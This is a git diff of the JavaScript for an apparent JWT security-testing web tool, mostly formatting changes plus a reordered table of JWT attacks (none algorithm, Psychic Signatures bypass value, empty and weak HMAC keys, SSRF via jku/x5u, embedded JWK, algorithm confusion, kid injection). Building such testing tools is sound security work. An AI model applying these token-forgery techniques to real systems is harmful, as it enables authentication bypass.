@@ -1,11 +1,10 @@
 // ====================== Not Yet Sorted
 
 
-
-// ====================== Classes 
-class TestCase{
+// ====================== Classes
+class TestCase {
     static counter = 1;
-    constructor({description, variantName, originalToken, testToken, originalReadable, testReadable, vulnerability}){
+    constructor({ description, variantName, originalToken, testToken, originalReadable, testReadable, vulnerability }) {
         this._validateVulnerability(vulnerability);
         this.testId = TestCase.counter++;
         this.description = description;
@@ -15,8 +14,8 @@ class TestCase{
         this.originalReadable = originalReadable;
         this.testReadable = testReadable;
         this.vulnerability = vulnerability;
-    }    
-    static resetCounter(){
+    }
+    static resetCounter() {
         TestCase.counter = 1;
     }
     _validateVulnerability(vuln) {
@@ -24,45 +23,45 @@ class TestCase{
         if (typeof vuln !== "object") {
             throw new Error("Vulnerability must be an object.");
         }
-    
-        const requiredKeys = ["name", "cve", "description","token_amount"];
+
+        const requiredKeys = ["name", "cve", "description", "token_amount"];
         for (const key of requiredKeys) {
             if (!(key in vuln)) {
                 throw new Error(`Vulnerability missing required key: ${key}`);
             }
         }
-    
+
         if (typeof vuln.name !== "string" || typeof vuln.description !== "string") {
             throw new Error("Vulnerability fields must be of type string (except 'cve').");
         }
     }
-    
+
 }
 // ====================== Globals
 const ESCAPE_SEQUENZ = "/#";
-const _alg_converter = {"PBES2-HS256+A128KW":"SHA-256","PBES2-HS384+A192KW":"SHA-384","PBES2-HS512+A256KW":"SHA-512","RSA-OAEP":"SHA-1","RSA-OAEP-256":"SHA-256","A128CBC-HS256":"AES-CBC","A192CBC-HS384":"AES-CBC","A256CBC-HS512":"AES-CBC","A128GCM":"AES-GCM","A192GCM":"AES-GCM","A256GCM":"AES-GCM","PS256":"SHA-256","PS384":"SHA-384","PS512":"SHA-512","ES256":["SHA-256","P-256"],"ES384":["SHA-384","P-384"],"ES512":["SHA-512","P-521"],"HS256":"SHA-256","HS384":"SHA-384","HS512":"SHA-512","RS256":"SHA-256","RS384":"SHA-384","RS512":"SHA-512"};
+const _alg_converter = { "PBES2-HS256+A128KW": "SHA-256", "PBES2-HS384+A192KW": "SHA-384", "PBES2-HS512+A256KW": "SHA-512", "RSA-OAEP": "SHA-1", "RSA-OAEP-256": "SHA-256", "A128CBC-HS256": "AES-CBC", "A192CBC-HS384": "AES-CBC", "A256CBC-HS512": "AES-CBC", "A128GCM": "AES-GCM", "A192GCM": "AES-GCM", "A256GCM": "AES-GCM", "PS256": "SHA-256", "PS384": "SHA-384", "PS512": "SHA-512", "ES256": ["SHA-256", "P-256"], "ES384": ["SHA-384", "P-384"], "ES512": ["SHA-512", "P-521"], "HS256": "SHA-256", "HS384": "SHA-384", "HS512": "SHA-512", "RS256": "SHA-256", "RS384": "SHA-384", "RS512": "SHA-512" };
 const _jwe_algorithm_to_key_length = {
-        "A128KW": 16,
-        "A192KW": 24,
-        "A256KW": 32,
-        "A128GCMKW": 16,
-        "A192GCMKW": 24,
-        "A256GCMKW": 32,
-        "PBES2-HS256+A128KW": 32,
-        "PBES2-HS384+A192KW": 48,
-        "PBES2-HS512+A256KW": 64
-    }
+    "A128KW": 16,
+    "A192KW": 24,
+    "A256KW": 32,
+    "A128GCMKW": 16,
+    "A192GCMKW": 24,
+    "A256GCMKW": 32,
+    "PBES2-HS256+A128KW": 32,
+    "PBES2-HS384+A192KW": 48,
+    "PBES2-HS512+A256KW": 64
+}
 var isJWTView = true;
 var isKeyMgmtView = false;
 var isJWEView = false;
 var isAttacksView = false;
-/** @type {object} 
+/** @type {object}
  * * Vulnerabilities object containing various vulnerabilities and their details
  * @property {string} name - Name of the vulnerability
  * @property {string} cve - Common Vulnerabilities and Exposures (CVE) identifier
  * @property {string} description - Description of the vulnerability
- * @property {number} token_amount - Number of tokens generated 
- * 
+ * @property {number} token_amount - Number of tokens generated
+ *
  * */
 const vulnerabilities = {
     SignatureExclusion: {
@@ -70,12 +69,6 @@ const vulnerabilities = {
         cve: 'CVE-2020-28042',
         description: 'Sending the token without signature.',
         token_amount: 1
-    },
-    SSRF: {
-        name: 'Server-Side Request Forgery (SSRF)',
-        cve: 'N/A', 
-        description: 'Test the jku/x5u header for SSRF vulnerability. If the server implement this feature without validating the URL, an attacker can exploit SSRF.',
-        token_amount: 4
     },
     NoneAlg: {
         name: "None Algorithm Attack",
@@ -89,7 +82,25 @@ const vulnerabilities = {
         description: "Exploits a vulnerability in Java 15–18 (CVE-2022-21449, 'Psychic Signatures') where ECDSA signatures weren't properly verified. Allows bypassing JWT verification by replacing the signature with MAYCAQACAQA",
         token_amount: 1
     },
-    CustomKey:{
+    EmptyKey: {
+        name: "Empty Key Attack",
+        cve: "CVE-2019-20933",
+        description: "Signing the token via HSxxx with a empty key \\x00 / AA==.",
+        token_amount: 3
+    },
+    WeakHMACKey: {
+        name: "Weak HMAC Key Attack",
+        cve: "CVE-2019-20933",
+        description: "Bruteforcing the HMAC key with a list of default secrets. This attack is possible if the server uses weak or default HMAC keys for signing JWTs.",
+        token_amount: 1
+    },
+    SSRF: {
+        name: 'Server-Side Request Forgery (SSRF)',
+        cve: 'N/A',
+        description: 'Test the jku/x5u header for SSRF vulnerability. If the server implement this feature without validating the URL, an attacker can exploit SSRF.',
+        token_amount: 4
+    },
+    CustomKey: {
         name: "Custom Key Attack / Public Key Injection via embedded JWK",
         cve: "CVE-2018-0114",
         description: "Abuses JWT implementations that accept and trust an embedded 'jwk' object directly in the JWT header. An attacker can generate their own key pair, embed the public key in the 'jwk' field, and sign the token with the corresponding private key.",
@@ -101,28 +112,15 @@ const vulnerabilities = {
         description: "Abuses JWT implementations that accept asymmetric algorithms (e.g., RS256, ES256) and incorrectly trust the algorithm field in the JWT header. An attacker can modify the algorithm to HS256 and use the public RSA/EC key as a symmetric HMAC key, bypassing signature validation and enabling unauthorized access.",
         token_amount: 11 * 3
     },
-    WeakHMACKey: {
-        name: "Weak HMAC Key Attack",
-        cve: "CVE-2019-20933",
-        description: "Bruteforcing the HMAC key with a list of default secrets. This attack is possible if the server uses weak or default HMAC keys for signing JWTs.",
-        token_amount: 1
-    },
-    EmptyKey: {
-        name: "Empty Key Attack",
-        cve: "CVE-2019-20933",
-        description: "Signing the token via HSxxx with a empty key \\x00 / AA==.",
-        token_amount: 3
-    },
     Kid: {
         name: "Kid Attacks",
         cve: "N/A",
         description: "Attacks that abuse the 'kid' field in the JWT header. This field is used to identify the key used to sign the token. An attacker can manipulate the 'kid' field to use a different key than intended, bypassing signature validation. This can work with different attack vectors like LFI, Command Injection, SQLi etc.",
-        token_amount: 9 
+        token_amount: 9
     }
 }
+
 // #region ====================== Helper Functions
-
-
 
 /**
  * Fetches a JWK from a given URL and returns the keys array.
@@ -132,51 +130,51 @@ const vulnerabilities = {
  * @throws {Error} If the fetch fails or the JWK format is invalid
  */
 async function fetchJwkFromUrl(jwkUrl) {
-  try {
-    const response = await fetch(jwkUrl, {
-      headers: {
-        'Accept': 'application/json'
-      }
-    });
+    try {
+        const response = await fetch(jwkUrl, {
+            headers: {
+                'Accept': 'application/json'
+            }
+        });
 
-    if (!response.ok) {
-      throw new Error(`HTTP error! Status: ${response.status}`);
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+
+        const jwkData = await response.json();
+
+        if (!jwkData.keys || !Array.isArray(jwkData.keys)) {
+            throw new Error('Invalid JWK format: "keys" property missing or malformed');
+        }
+
+        return jwkData.keys; // array of JWKs
+    } catch (error) {
+        console.error('Failed to fetch or parse JWK:', error);
+        throw error;
     }
-
-    const jwkData = await response.json();
-
-    if (!jwkData.keys || !Array.isArray(jwkData.keys)) {
-      throw new Error('Invalid JWK format: "keys" property missing or malformed');
-    }
-
-    return jwkData.keys; // array of JWKs
-  } catch (error) {
-    console.error('Failed to fetch or parse JWK:', error);
-    throw error;
-  }
 }
 
 /**
  * Parses a Kid Custom Payload String and returns the parsed content.
  * The String should contain kid_payload - expected_key pairs separated by semicolons.
  * The expected key is optional and can be empty.
- * String should look like this: 
+ * String should look like this:
  * kid_payload;[expected_key(Base64)]
  * foo;bar
  * abc;123
  * xyz
  * into an array of dictionaries
  * @param {String} content - e.g. abc;xyz\nfoo;bar\n123
- * @return {Array<{kid_payload: string, expected_key: string(Base64)}>} 
+ * @return {Array<{kid_payload: string, expected_key: string(Base64)}>}
  */
-function parsePayloadContentForKid(content, delimitor = ';'){
+function parsePayloadContentForKid(content, delimitor = ';') {
     return content
         .split('\n')
         .map(line => line.trim())
         .filter(line => line)
         .map((line, index) => {
             const seperatorIndex = line.indexOf(delimitor)
-            if (seperatorIndex === -1){
+            if (seperatorIndex === -1) {
                 console.debug(`Line ${index + 1}: No seperator found -> use whole line as payload `)
                 return {
                     payload: line,
@@ -213,7 +211,7 @@ function randomAsciiString(length) {
  *
  * @param {*} condition - The condition to check.
  * @param {string} [message="Assertion failed"] - The error message to throw if the condition is false.
- * @throws {Error} If the condition is false, an error is thrown with the provided message. 
+ * @throws {Error} If the condition is false, an error is thrown with the provided message.
  */
 function assert(condition, message = "Assertion failed") {
     if (!condition) {
@@ -223,7 +221,7 @@ function assert(condition, message = "Assertion failed") {
 
 /**
  * Compares two Uint8Arrays for equality.
- * 
+ *
  *
  * @param {Uint8Array} a
  * @param {Uint8Array} b
@@ -232,9 +230,9 @@ function assert(condition, message = "Assertion failed") {
 function areUint8ArraysEqual(a, b) {
     assert(a instanceof Uint8Array && b instanceof Uint8Array, "Both arguments must be Uint8Arrays");
     if (a.length !== b.length) return false;
-        for (let i = 0; i < a.length; i++) {
-            if (a[i] !== b[i]) return false;
-    }   
+    for (let i = 0; i < a.length; i++) {
+        if (a[i] !== b[i]) return false;
+    }
     return true;
 }
 
@@ -257,12 +255,12 @@ function base64ToUint8Array(base64) {
  * @param {string} jsonString - The JSON string to unescape.
  * @return {string} The unescaped JSON string.
  */
-function unescapeCustomJsonKeys(jsonString,skip=false) {
+function unescapeCustomJsonKeys(jsonString, skip = false) {
     // TODO: This is crazy bad coding. For a better solution, all attack functions need to refactored to return duplicate header tokens and the unescapeFunction should be called in the generateToken function.
     if (skip) return jsonString;
     const regex = new RegExp(`"${ESCAPE_SEQUENZ}([^"]*)"`, 'g');
-    jsonString = jsonString.replace(regex,'"$1"');
-    return jsonString; 
+    jsonString = jsonString.replace(regex, '"$1"');
+    return jsonString;
 }
 
 /**
@@ -270,30 +268,29 @@ function unescapeCustomJsonKeys(jsonString,skip=false) {
  *
  */
 function beautifyJWT() {
-    document.getElementById("decodedHeader").value = JSON_Beautify_But_Way_Cooler(document.getElementById("decodedHeader").value,4);
-    document.getElementById("decodedBody").value = JSON_Beautify_But_Way_Cooler(document.getElementById("decodedBody").value,4);
+    document.getElementById("decodedHeader").value = JSON_Beautify_But_Way_Cooler(document.getElementById("decodedHeader").value, 4);
+    document.getElementById("decodedBody").value = JSON_Beautify_But_Way_Cooler(document.getElementById("decodedBody").value, 4);
 }
 
 /**
  * Unbeautifies the JWT header and body in the input fields.
  *
  */
-function unbeautifyJWT(){
+function unbeautifyJWT() {
     document.getElementById("decodedHeader").value = unbeautifyJson(document.getElementById("decodedHeader").value);
     document.getElementById("decodedBody").value = unbeautifyJson(document.getElementById("decodedBody").value);
 }
 
-
 /**
  * This function removes all newlines and spaces from a JSON string.
- * 
+ *
  * @param {string} jsonString - The JSON string to be unbeautified.
  * @return {string} The JSON string without newlines and spaces.
  */
 function unbeautifyJson(jsonString) {
     jsonString = jsonString.replace(/\n */g, '').replace(/^ */g, '').replace(/ *$/g, '').replace(/:\s*/g, ':')
     const tmp = replaceCustomByteEscapeSequences(jsonString);
-    console.debug("handleJSONForTokenEncoding:",tmp);
+    console.debug("handleJSONForTokenEncoding:", tmp);
     return tmp
 }
 
@@ -304,21 +301,21 @@ function unbeautifyJson(jsonString) {
  * @param {number} [indent=4] - The number of spaces to use for indentation (default is 4).
  * @return {string} The beautified JSON string.
  */
-function JSON_Beautify_But_Way_Cooler(string,indent = 4){
+function JSON_Beautify_But_Way_Cooler(string, indent = 4) {
     // rudimentary beautifier
     let depth = 0;
     let result = ""
-    string = unbeautifyJson(string); 
-    for (let char of string){
+    string = unbeautifyJson(string);
+    for (let char of string) {
         if (char === '{' || char === '[') {
             depth++;
-            result += char + "\n" + " ".repeat(Math.max(depth * indent,0));
+            result += char + "\n" + " ".repeat(Math.max(depth * indent, 0));
         } else if (char === '}' || char === ']') {
             depth--;
-            result += '\n' + " ".repeat(Math.max(depth * indent,0)) + char;
+            result += '\n' + " ".repeat(Math.max(depth * indent, 0)) + char;
         }
         else if (char === ',') {
-            result += char + "\n" + " ".repeat(Math.max(depth * indent,0));
+            result += char + "\n" + " ".repeat(Math.max(depth * indent, 0));
         } else if (char === ':') {
             result += char + " ";
         } else {
@@ -338,7 +335,7 @@ function escapeUnprintableBytesWithCustomEscapeSequence(str) {
     console.debug("escapeUnprintableBytesWithCustomEscapeSequence:", str);
     return str.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F\x81\x8D\x8F\x90\x9D\xA0\xAD]/g, (byte) => {
         const hex = byte.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase();
-        console.debug("escapeUnprintableBytesWithCustomEscapeSequence: Found unprintable byte",byte,hex);
+        console.debug("escapeUnprintableBytesWithCustomEscapeSequence: Found unprintable byte", byte, hex);
         return `${ESCAPE_SEQUENZ}${hex}`;
     });
 }
@@ -348,7 +345,7 @@ function escapeUnprintableBytesWithCustomEscapeSequence(str) {
  * @return {string} - String with replaced byte values.
  */
 function replaceCustomByteEscapeSequences(str) {
-    console.debug("replaceCustomByteEscapeSequences:",str);
+    console.debug("replaceCustomByteEscapeSequences:", str);
     const regex = new RegExp(`${ESCAPE_SEQUENZ}([0-9A-Fa-f]{2})`, 'g');
     if (str.match(regex)) console.debug("Found custom byte escape sequences");
     return str.replace(regex, (match, hex) => {
@@ -385,7 +382,7 @@ function prettyPrintCenter(title, width = 50, char = "=") {
  * Checks if a string is a valid Base64 URL encoded string
  *
  * @param {string} str
- * @return {boolean} 
+ * @return {boolean}
  */
 function isBase64Url(str) {
     return /^[A-Za-z0-9\-_]+={0,2}$/.test(str);
@@ -395,7 +392,7 @@ function isBase64Url(str) {
  * Checks if a string is a valid JWT (JSON Web Token)
  *
  * @param {string} token
- * @return {boolean} 
+ * @return {boolean}
  */
 function isValidJWT(token) {
     return /^[A-Za-z0-9\-_]+={0,2}\.[A-Za-z0-9\-_]+={0,2}\.[A-Za-z0-9\-_]*={0,2}$/.test(token);
@@ -404,16 +401,16 @@ function isValidJWT(token) {
  * Checks if jwe is a valid JWE (JSON Web Encryption) string
  *
  * @param {string} jwe
- * @return {boolean} 
+ * @return {boolean}
  */
-function isValidJWE(jwe){
+function isValidJWE(jwe) {
     return /^[A-Za-z0-9\-_]+={0,2}\.(?:[A-Za-z0-9\-_]+={0,2})?\.[A-Za-z0-9\-_]*={0,2}\.[A-Za-z0-9\-_]*={0,2}\.[A-Za-z0-9\-_]*={0,2}$/.test(jwe);
 }
 /**
  * Converts a Base64 string to Base64 URL format
  *
  * @param {string} str
- * @return {string} 
+ * @return {string}
  */
 function base64_to_URL(str) {
     return str.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
@@ -423,23 +420,23 @@ function base64_to_URL(str) {
  * Converts a Base64 URL string to Base64 format
  *
  * @param {string} str
- * @return {string} 
+ * @return {string}
  */
 function URL_to_base64(str) {
     if (str.length % 4 === 0) {
         var padding = "";
     }
     else {
-        var padding = '='.repeat(4 - (str.length % 4)); 
+        var padding = '='.repeat(4 - (str.length % 4));
     }
-    return str.replace(/-/g, '+').replace(/_/g, '/')+padding;
+    return str.replace(/-/g, '+').replace(/_/g, '/') + padding;
 }
 
 /**
  * Encodes a binary string to Base64 URL format
  *
  * @param {string} str
- * @return {string} 
+ * @return {string}
  */
 function b64URLencode(str) {
     return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
@@ -449,7 +446,7 @@ function b64URLencode(str) {
  * Decodes a Base64 URL string to a binary string
  *
  * @param {string} str
- * @return {string} 
+ * @return {string}
  */
 function b64URLdecode(str) {
     const b64encoded = str.replace(/-/g, '+').replace(/_/g, '/');
@@ -457,7 +454,7 @@ function b64URLdecode(str) {
         var padding = "";
     }
     else {
-        var padding = '='.repeat(4 - (str.length % 4)); 
+        var padding = '='.repeat(4 - (str.length % 4));
     }
     return atob(b64encoded + padding);
 }
@@ -515,14 +512,14 @@ function decodeKey(keyString, isPublicKey) {
     }
     // JWK format
     else if (keyString.startsWith("{") && keyString.endsWith("}")) {
-        try{ 
+        try {
             const parsed = JSON.parse(keyString);
             if ('kty' in parsed) {
                 return isPublicKey ? extractPublicJwk(parsed) : parsed
             }
         }
-        catch(e){
-            console.error("decodeKey: JSON parse failed",e)
+        catch (e) {
+            console.error("decodeKey: JSON parse failed", e)
             return null;
         }
     }
@@ -532,7 +529,7 @@ function decodeKey(keyString, isPublicKey) {
  * Converts an ArrayBuffer to a Base64 URL encoded string
  *
  * @param {arrayBuffer} arrayBuffer
- * @return {string} Base64 URL encoded string 
+ * @return {string} Base64 URL encoded string
  */
 function arrayBufferToBase64Url(arrayBuffer) {
     // quite messy but this was neccesary because I didn't understood the difference between ArrayBuffer and Uint8Array at the time
@@ -545,11 +542,11 @@ function arrayBufferToBase64Url(arrayBuffer) {
  * @param {Uint8Array} array
  * @return {string} Base64 URL encoded string
  */
-function Uint8ArrayTobase64Url(array){
+function Uint8ArrayTobase64Url(array) {
     if ((array instanceof ArrayBuffer)) { // Nothing to see here
         array = new Uint8Array(array);
     }
-    return btoa(String.fromCharCode(...array)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""); 
+    return btoa(String.fromCharCode(...array)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
 }
 
 /**
@@ -562,7 +559,7 @@ function Uint8ArrayTobase64Url(array){
 function base64urlToUint8Array(str) {
     /**
      * takes base64url encoded string and converts it to Uint8Array :O
-     * Needed for the signature 
+     * Needed for the signature
      * returns array or NULL if malformed b64
      */
     if (!str) {
@@ -578,14 +575,14 @@ function base64urlToUint8Array(str) {
         var padding = "";
     }
     else {
-        var padding = '='.repeat(4 - (str.length % 4)); 
+        var padding = '='.repeat(4 - (str.length % 4));
     }
     try {
-        const raw = atob(base64+padding);
+        const raw = atob(base64 + padding);
         return new Uint8Array([...raw].map(c => c.charCodeAt(0)));
     }
-    catch(e){
-        console.error("Malformed b64",e);
+    catch (e) {
+        console.error("Malformed b64", e);
         return null;
     }
 }
@@ -595,7 +592,7 @@ function base64urlToUint8Array(str) {
  *
  * @param {string} hexString
  * @throws {Error} if the hex string is uneven
- * @return {Uint8Array} 
+ * @return {Uint8Array}
  */
 function hexToUint8Array(hexString) {
     if (hexString.length % 2 !== 0) {
@@ -616,7 +613,7 @@ function hexToUint8Array(hexString) {
  * This function handles the right encoding of the JSON string. It removes all newlines and hopefully all spaces that are unnecessary.
  *
  * @param {string} jsonString
- * @return {string} The JSON without newlines and spaces. 
+ * @return {string} The JSON without newlines and spaces.
  * @description Since this function needs to deal with invalid JSON aswell, it is a bit tricky to remove whitespaces.
 */
 function handleJSONForTokenEncoding(jsonString) {
@@ -625,20 +622,20 @@ function handleJSONForTokenEncoding(jsonString) {
     if (contentType === 'Valid JSON') {
         return JSON.stringify(JSON.parse(jsonString));
     }
-    
+
     // /*
     //  else if (contentType === 'Invalid JSON') {
-        
-    //     //  * 
+
+    //     //  *
     //     //  * remove all newlines and spaces leads to stuff like name: "John Doe" -> name:"JohnDoe"
     //     //  * which is pretty bad
-    //     //  * Since it is not garanted that every string has a closing "quote 
+    //     //  * Since it is not garanted that every string has a closing "quote
     //     //  * we cant just take every white space except in those in quotes
     //     //  * so here some rules which hopefully cover all cases
     //     //  * Remove all newlines and all spaces adjacent
     //     //  * Remove all spaces at the beginning and end of the string
-    //     //  * Remove all spaces after a colon 
-    //    //? Am i missing a rule? 
+    //     //  * Remove all spaces after a colon
+    //    //? Am i missing a rule?
     //    jsonString = jsonString.replace(/\n */g, '').replace(/^ */g, '').replace(/ *$/g, '').replace(/: /g, ':')
     //    const tmp = replaceCustomByteEscapeSequences(jsonString);
     //    console.debug("handleJSONForTokenEncoding:",tmp);
@@ -651,17 +648,17 @@ function handleJSONForTokenEncoding(jsonString) {
 
 /**
  * This function handles the "parsing"/beautifying of the JSON string.
- * 
+ *
  *
  * @param {string} jsonString - The JSON string to be parsed.
  * @param {number} [indent=4] - The number of spaces to use for indentation (default is 4).
  * @return {string} The beatified JSON string.
  * @description This function handles the "parsing"/beautifying of the JSON string.
  * Since invalid JSON needs to be handled aswell, this function can deal with Valid JSON, Invalid JSON and Raw Text.
- * Which mode is used is determined by the contentTypeOfJSON Element. 
+ * Which mode is used is determined by the contentTypeOfJSON Element.
  * It uses JSON.stringify to parse valid JSON and a custom function to beautify invalid JSON.
  */
-function handleJSONForTokenDecoding(jsonString,indent = 4) {
+function handleJSONForTokenDecoding(jsonString, indent = 4) {
     // contentType = 'Valid JSON' | 'Invalid JSON' | 'Raw Text'
     const contentType = document.getElementById("contentTypeOfJSON").value;
     if (contentType === 'Valid JSON') {
@@ -678,7 +675,7 @@ function handleJSONForTokenDecoding(jsonString,indent = 4) {
 /**
  * Decodes a JWT token and displays the decoded header and body in the respective input fields.
  *
- * @return {void} 
+ * @return {void}
  * @description This function handles the whole decoding process of the JWT token.
  * It takes the JWT from the input field ("token"), splits it into header, body, and signature,
  * decodes the header and body, and displays them in the respective input fields.
@@ -687,19 +684,19 @@ function handleJSONForTokenDecoding(jsonString,indent = 4) {
 function decodeToken() {
     document.getElementById("jwtErrorMessage").innerText = "";
     const token = document.getElementById("token").value;
-    if (!(isValidJWT(token))){
+    if (!(isValidJWT(token))) {
         jwt_error_message("Bad Token");
         return;
     }
     document.getElementById("jwtErrorMessage").innerText = "";
     const token_parts = token.split(".");
-    try{
-        document.getElementById("decodedHeader").value = handleJSONForTokenDecoding(b64URLdecode(token_parts[0]),4);
-        document.getElementById("decodedBody").value = handleJSONForTokenDecoding(b64URLdecode(token_parts[1]),4);
+    try {
+        document.getElementById("decodedHeader").value = handleJSONForTokenDecoding(b64URLdecode(token_parts[0]), 4);
+        document.getElementById("decodedBody").value = handleJSONForTokenDecoding(b64URLdecode(token_parts[1]), 4);
         autoResize(document.getElementById("decodedHeader"));
         autoResize(document.getElementById("decodedBody"));
     }
-    catch (e){
+    catch (e) {
         jwt_error_message(e);
 
     }
@@ -709,7 +706,7 @@ function decodeToken() {
  * Encodes the JWT token by signing it with the specified algorithm and private key.
  *
  * @param {boolean} [triggeredByButton=false]
- * @return {Promise<void>} 
+ * @return {Promise<void>}
  * @description This function handles the encoding process of the JWT token.
  * It takes the decoded header and body from the input fields,
  * encodes them to Base64URL format, and signs the token using the specified algorithm and private key.
@@ -718,22 +715,22 @@ function decodeToken() {
  * Since there is a checkbox for auto signing, this function checks if the checkbox is checked
  * or if the function was triggered by a button click (triggeredByButton)
  * before proceeding with the signing process in the case that the old signature should be kept.
- */ 
+ */
 async function encodeToken(triggeredByButton = false) {
     // Try to encode the Header and Body from the input fields
     document.getElementById("jwtErrorMessage").innerText = "";
-    try { 
+    try {
         var header = b64URLencode(handleJSONForTokenEncoding(document.getElementById("decodedHeader").value));
     }
-    catch (e){
+    catch (e) {
         jwt_error_message(e);
         document.getElementById("token").value = "";
         return;
     }
-    try{
+    try {
         var body = b64URLencode(handleJSONForTokenEncoding(document.getElementById("decodedBody").value));
     }
-    catch (e){
+    catch (e) {
         jwt_error_message(e);
         document.getElementById("token").value = "";
         return;
@@ -741,20 +738,20 @@ async function encodeToken(triggeredByButton = false) {
 
     let signature = "";
     // Check if the token should be signed (triggered by button or auto sign enabled)
-    if ((triggeredByButton || document.getElementById("isAutoSignEnabled").checked)){
+    if ((triggeredByButton || document.getElementById("isAutoSignEnabled").checked)) {
         if ((document.getElementById('algorithm').value != "None")) {
             const alg = document.getElementById("algorithm").value;
-            if (alg[0]==='H'){
-                signature = await signHS(header,body,alg);         
+            if (alg[0] === 'H') {
+                signature = await signHS(header, body, alg);
             }
-            else if (alg[0]==='R'){
-                signature = await signRS(header,body,alg);
+            else if (alg[0] === 'R') {
+                signature = await signRS(header, body, alg);
             }
-            else if (alg[0]==='E'){
-                signature = await signES(header,body,alg);
+            else if (alg[0] === 'E') {
+                signature = await signES(header, body, alg);
             }
-            else if (alg[0]==='P'){
-                signature = await signPS(header,body,alg);
+            else if (alg[0] === 'P') {
+                signature = await signPS(header, body, alg);
             }
         }
     }
@@ -772,24 +769,24 @@ async function encodeToken(triggeredByButton = false) {
  * @return {Promise<boolean>} - Returns true if the signature is valid, false otherwise.
  * @description This function takes the JWT from the input field ("token").
  */
-async function verifySignature(){
+async function verifySignature() {
     const enc = new TextEncoder();
-    
+
     // Read Token
     let signature = document.getElementById("token").value.split(".")[2];
-    const token_value = document.getElementById("token").value.replace("." + signature,"");
+    const token_value = document.getElementById("token").value.replace("." + signature, "");
     const alg = document.getElementById("algorithm").value;
-    
+
     signature = base64urlToUint8Array(signature)
     try { // Read key from the right input field
-        var key = (alg[0]=='H') ? document.getElementById('key').value : document.getElementById('publicKey').value; 
+        var key = (alg[0] == 'H') ? document.getElementById('key').value : document.getElementById('publicKey').value;
     }
     catch {
         key = "";
     }
-    if (signature && token_value && alg && key){
+    if (signature && token_value && alg && key) {
 
-        if (alg[0]==='H'){ // symmetric key
+        if (alg[0] === 'H') { // symmetric key
             try { // import key
                 const sym_key = await crypto.subtle.importKey(
                     "raw",
@@ -800,25 +797,25 @@ async function verifySignature(){
                 );
                 // verify signature
                 var valid = await crypto.subtle.verify(
-                    {"name": "HMAC"},
+                    { "name": "HMAC" },
                     sym_key,
-                    signature, 
+                    signature,
                     enc.encode(token_value)
                 )
                 // reset Error message
-            
+
             }
-            catch(e){
+            catch (e) {
                 // set Error message
                 jwt_error_message("Key: " + e);
             }
         }
-        else if (alg[0]==='R'){ // asymmetric key 
+        else if (alg[0] === 'R') { // asymmetric key
             try { // import key
                 // if key is PEM format, import as spki, else import as JWK
                 const publicKey = await crypto.subtle.importKey(
                     key.match(/^-----BEGIN [A-Z ]+-----/) ? "spki" : "jwk",
-                    decodeKey(key,isPublicKey=true),
+                    decodeKey(key, isPublicKey = true),
                     { name: "RSASSA-PKCS1-v1_5", hash: _alg_converter[alg] },
                     true,
                     ["verify"]
@@ -826,53 +823,53 @@ async function verifySignature(){
                 // verify signature
                 // RSASSA-PKCS1-v1_5 is the default algorithm for RS256, RS384, RS512
                 var valid = await crypto.subtle.verify(
-                    {"name":"RSASSA-PKCS1-v1_5"},
+                    { "name": "RSASSA-PKCS1-v1_5" },
                     publicKey,
                     signature,
                     enc.encode(token_value)
                 );
-            
+
             }
-            catch(e){
-                jwt_error_message("Public Key: " +  e);
+            catch (e) {
+                jwt_error_message("Public Key: " + e);
             }
-            
+
         }
-        else if (alg[0]==='E'){ // asymmetric key
+        else if (alg[0] === 'E') { // asymmetric key
             // ECDSA is the default algorithm for ES256, ES384, ES512
             try {
                 // if key is PEM format, import as spki, else import as JWK
                 const publicKey = await crypto.subtle.importKey(
                     key.match(/^-----BEGIN [A-Z ]+-----/) ? "spki" : "jwk",
-                    decodeKey(key,isPublicKey=true),
+                    decodeKey(key, isPublicKey = true),
                     { name: "ECDSA", namedCurve: _alg_converter[alg][1] },
                     false,
                     ["verify"]
                 );
                 // verify signature
                 var valid = await crypto.subtle.verify(
-                {
+                    {
                         name: "ECDSA",
-                        hash: {name: _alg_converter[alg][0]}
+                        hash: { name: _alg_converter[alg][0] }
                     },
                     publicKey,
                     signature,
                     enc.encode(token_value)
                 );
-            
+
             }
-            catch(e){
+            catch (e) {
                 jwt_error_message("Public Key:" + e);
             }
         }
-        else if (alg[0]==='P'){ // asymmetric key
+        else if (alg[0] === 'P') { // asymmetric key
             // RSA-PSS is the default algorithm for PS256, PS384, PS512
             try {
                 // import key
                 // if key is PEM format, import as spki, else import as JWK
                 const publicKey = await crypto.subtle.importKey(
                     key.match(/^-----BEGIN [A-Z ]+-----/) ? "spki" : "jwk",
-                    decodeKey(key,isPublicKey=true),
+                    decodeKey(key, isPublicKey = true),
                     { name: "RSA-PSS", hash: _alg_converter[alg] },
                     true,
                     ["verify"]
@@ -880,32 +877,32 @@ async function verifySignature(){
                 // verify signature
                 var valid = await crypto.subtle.verify({
                     name: "RSA-PSS",
-                    saltLength: _alg_converter[alg].split("-")[1]/8 //PS256 -> 32 bit, 384 -> 48, 512 -> 64
-                }, 
-                publicKey,
-                signature,
-                enc.encode(token_value)
+                    saltLength: _alg_converter[alg].split("-")[1] / 8 //PS256 -> 32 bit, 384 -> 48, 512 -> 64
+                },
+                    publicKey,
+                    signature,
+                    enc.encode(token_value)
                 );
-            
+
             }
-            catch(e){
+            catch (e) {
                 jwt_error_message("Public Key:" + e);
             }
         }
-        
+
     }
     if (valid || alg === "none") { // TODO should None be valid or invalid?
         console.log("Signature is valid");
-        document.getElementById("signatureIcon").src  = "img/Signature_valid.svg"; 
-        document.getElementById("signatureIcon").style.display  = "block";
+        document.getElementById("signatureIcon").src = "img/Signature_valid.svg";
+        document.getElementById("signatureIcon").style.display = "block";
         document.getElementsByClassName("signature-heading")[0].style.backgroundColor = "#06A2B0";
         document.getElementById("signatureStatus").innerText = "valid";
         return true;
     }
-    else{
+    else {
         console.log("Signature is invalid");
-        document.getElementById("signatureIcon").src  = "img/Signature_invalid.svg"; 
-        document.getElementById("signatureIcon").style.display  = "block";
+        document.getElementById("signatureIcon").src = "img/Signature_invalid.svg";
+        document.getElementById("signatureIcon").style.display = "block";
         document.getElementsByClassName("signature-heading")[0].style.backgroundColor = "#D90022";
         document.getElementById("signatureStatus").innerText = "invalid";
         return false;
